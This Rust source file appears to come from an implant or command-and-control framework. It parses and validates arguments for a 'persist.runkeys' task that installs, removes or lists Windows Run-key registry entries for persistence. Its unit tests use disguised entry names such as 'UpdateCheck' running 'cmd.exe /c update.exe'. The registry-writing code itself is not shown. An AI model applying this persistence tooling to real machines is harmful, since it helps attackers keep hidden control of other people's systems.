//! The task-argument grammar: `persist.runkeys [action] [hive] [name]
//! <command>`. The operator UI serializes a task form by joining
//! parameter values with single spaces in declaration order, so the
//! positional reading is the canonical wire shape; the `key=`
//! assignments are the hand-typed alternative, and the command is the
//! raw remainder either way -- a command line survives the grammar only
//! as the remainder, which is why the command parameter is the verb's
//! trailing one.
//!
//! The slots refuse what they do not know rather than half-reading
//! under a typo (the same rule the domainenum grammar holds): a bare
//! second token is a hive or the refusal names the hives, and the
//! per-action validation teaches the shape each action needs.

/// What the task asked the verb to do with the seat.
#[derive(Debug, PartialEq, Eq)]
pub(crate) enum Action {
    /// Report the Run values that sit under the hives. The default: a
    /// bare `persist.runkeys` is a read, never a write.
    List,
    /// Write one value under the hive's Run key.
    Install,
    /// Delete one value the hive's Run key carries.
    Remove,
}

/// Which root the action addresses. The defaults differ on purpose:
/// HKCU holds per-user seats an ordinary implant context can write,
/// HKLM machine-wide ones that need elevation -- the refusal names
/// which is which when a write fails.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum Hive {
    Hkcu,
    Hklm,
}

/// A parsed task argument string.
#[derive(Debug, PartialEq, Eq)]
pub(crate) struct Arguments {
    pub action: Action,
    pub hive: Hive,
    /// The registry value name -- the seat's own name, not the command.
    /// For `list`, a filter narrowing the report to one value.
    pub name: Option<String>,
    /// The command line the seat runs; the raw remainder of the grammar.
    pub command: Option<String>,
}

/// Parses the argument grammar.
pub(crate) fn parse(arguments: &str) -> Result<Arguments, String> {
    let text = arguments.trim();
    let (action_token, rest) = split_first_token(text);
    let action = action_of(action_token)?;
    let rest = rest.trim_start();
    if rest.is_empty() {
        return Ok(Arguments {
            action,
            hive: Hive::Hkcu,
            name: None,
            command: None,
        });
    }

    // The hive: `hive=` up to whitespace, the positional token, or
    // absent when the name rode keyed and the default hive stands.
    let (hive, rest) = if let Some(value) = rest.strip_prefix("hive=") {
        let (value, remainder) = split_first_token(value);
        (hive_of(value)?, remainder)
    } else if rest.starts_with("name=") {
        (Hive::Hkcu, rest)
    } else {
        let (value, remainder) = split_first_token(rest);
        (hive_of(value)?, remainder)
    };
    let rest = rest.trim_start();

    // The name: `name=` or the positional token; absent when the
    // command rode keyed behind the action alone.
    let (name, rest) = if rest.is_empty() {
        (None, rest)
    } else if let Some(value) = rest.strip_prefix("name=") {
        let (value, remainder) = split_first_token(value);
        (Some(value.to_string()), remainder)
    } else if rest.starts_with("command=") {
        (None, rest)
    } else {
        let (value, remainder) = split_first_token(rest);
        (Some(value.to_string()), remainder)
    };

    // The command: `command=` then everything after, or the positional
    // remainder verbatim.
    let command = if rest.trim().is_empty() {
        None
    } else if let Some(value) = rest.trim_start().strip_prefix("command=") {
        (!value.trim().is_empty()).then(|| value.trim().to_string())
    } else {
        Some(rest.trim().to_string())
    };

    Ok(Arguments {
        action,
        hive,
        name,
        command,
    })
}

/// Checks the parsed grammar against the action it names: install needs
/// its seat and its command, remove needs the seat and refuses a
/// command, and list is a read that carries no command. A task the
/// action cannot honor refuses here, before anything touches the hive.
pub(crate) fn validate(arguments: &Arguments) -> Result<(), String> {
    let grammar = "the grammar is: runkeys <install|remove|list> <hkcu|hklm> <name> <command>";
    match (&arguments.action, &arguments.name, &arguments.command) {
        (Action::Install, None, _) => Err(format!(
            "install needs the value name for the seat; {grammar}"
        )),
        (Action::Install, Some(_), None) => Err(format!(
            "install needs the command as the trailing remainder; {grammar}"
        )),
        (Action::Remove, None, _) => {
            Err(format!("remove needs the value name it deletes; {grammar}"))
        }
        (Action::Remove, Some(_), Some(_)) => Err(format!(
            "command rides install only; remove takes the name alone; {grammar}"
        )),
        (Action::List, _, Some(_)) => Err(format!(
            "command rides install only; list is the read; {grammar}"
        )),
        _ => Ok(()),
    }
}

/// The action half of the grammar: a bare token or `action=<token>`,
/// case-insensitive.
fn action_of(token: &str) -> Result<Action, String> {
    let action = token.strip_prefix("action=").unwrap_or(token);
    match action.to_ascii_lowercase().as_str() {
        "" | "list" => Ok(Action::List),
        "install" => Ok(Action::Install),
        "remove" => Ok(Action::Remove),
        // The refusal quotes the token as the operator typed it; the
        // case-fold was this parser's own doing.
        _ => Err(format!(
            "persist.runkeys: unknown action '{action}' (install, remove, list)"
        )),
    }
}

/// The hive half of the grammar, case-insensitive. A bare token that is
/// not a hive refuses naming the two -- `runkeys remove UpdateCheck`
/// reads its second token as the hive slot, and the refusal teaches the
/// shape instead of deleting a seat named like a typo.
fn hive_of(token: &str) -> Result<Hive, String> {
    let hive = token.strip_prefix("hive=").unwrap_or(token);
    match hive.to_ascii_lowercase().as_str() {
        "hkcu" => Ok(Hive::Hkcu),
        "hklm" => Ok(Hive::Hklm),
        _ => Err(format!(
            "persist.runkeys: unknown hive '{hive}' (hkcu, hklm); the second \
             token is the hive the action addresses"
        )),
    }
}

fn split_first_token(text: &str) -> (&str, &str) {
    match text.split_once(char::is_whitespace) {
        Some((first, rest)) => (first, rest),
        None => (text, ""),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_positional_form_is_the_wire_shape() {
        // The UI joins values with single spaces: action, hive, name,
        // then the command as the trailing remainder -- spaces inside
        // the command survive.
        assert_eq!(
            parse("install hkcu UpdateCheck cmd.exe /c update.exe /quiet").unwrap(),
            Arguments {
                action: Action::Install,
                hive: Hive::Hkcu,
                name: Some("UpdateCheck".into()),
                command: Some("cmd.exe /c update.exe /quiet".into()),
            }
        );
        assert_eq!(
            parse("remove hklm UpdateCheck").unwrap(),
            Arguments {
                action: Action::Remove,
                hive: Hive::Hklm,
                name: Some("UpdateCheck".into()),
                command: None,
            }
        );
    }

    #[test]
    fn the_keyed_form_teaches_the_same_read() {
        assert_eq!(
            parse("action=install hive=hklm name=UpdateCheck command=cmd /c x").unwrap(),
            Arguments {
                action: Action::Install,
                hive: Hive::Hklm,
                name: Some("UpdateCheck".into()),
                command: Some("cmd /c x".into()),
            }
        );
        // A keyed name without a hive is the one shape the positional
        // read cannot express -- the default hive stands.
        assert_eq!(
            parse("remove name=UpdateCheck").unwrap(),
            Arguments {
                action: Action::Remove,
                hive: Hive::Hkcu,
                name: Some("UpdateCheck".into()),
                command: None,
            }
        );
        assert_eq!(
            parse("list name=UpdateCheck").unwrap(),
            Arguments {
                action: Action::List,
                hive: Hive::Hkcu,
                name: Some("UpdateCheck".into()),
                command: None,
            }
        );
    }

    #[test]
    fn tokens_read_bare_assigned_and_cased() {
        assert_eq!(parse("").unwrap().action, Action::List);
        assert_eq!(parse("").unwrap().hive, Hive::Hkcu);
        assert_eq!(parse("INSTALL").unwrap().action, Action::Install);
        assert_eq!(parse("action=List").unwrap().action, Action::List);
        assert_eq!(parse("install HKLM x cmd").unwrap().hive, Hive::Hklm);
        assert_eq!(parse("list hive=Hkcu").unwrap().hive, Hive::Hkcu);
    }

    #[test]
    fn unknown_tokens_refuse_naming_the_choices() {
        // A typo refuses the task rather than half-reading under it --
        // and `remove UpdateCheck` (name where the hive slot sits) is
        // the refusal the grammar owes its operator.
        let action = parse("uninstall x").unwrap_err();
        assert!(action.contains("unknown action 'uninstall'"), "{action}");
        assert!(action.contains("install, remove, list"), "{action}");

        let hive = parse("remove UpdateCheck").unwrap_err();
        assert!(hive.contains("unknown hive 'UpdateCheck'"), "{hive}");
        assert!(hive.contains("hkcu, hklm"), "{hive}");
    }

    #[test]
    fn each_action_gets_the_parts_it_needs() {
        // Install: the seat and its command.
        assert!(validate(&parse("install hkcu UpdateCheck cmd /c x").unwrap()).is_ok());
        assert!(validate(&parse("install hkcu").unwrap()).is_err());
        assert!(validate(&parse("install hkcu UpdateCheck").unwrap()).is_err());

        // Remove: the seat alone.
        assert!(validate(&parse("remove hklm UpdateCheck").unwrap()).is_ok());
        assert!(validate(&parse("remove hklm").unwrap()).is_err());
        assert!(validate(&parse("remove hklm UpdateCheck cmd /c x").unwrap()).is_err());

        // List: a read, with an optional name filter, never a command.
        assert!(validate(&parse("list").unwrap()).is_ok());
        assert!(validate(&parse("list hklm UpdateCheck").unwrap()).is_ok());
        assert!(validate(&parse("list hklm cmd /c x").unwrap()).is_err());
    }
}
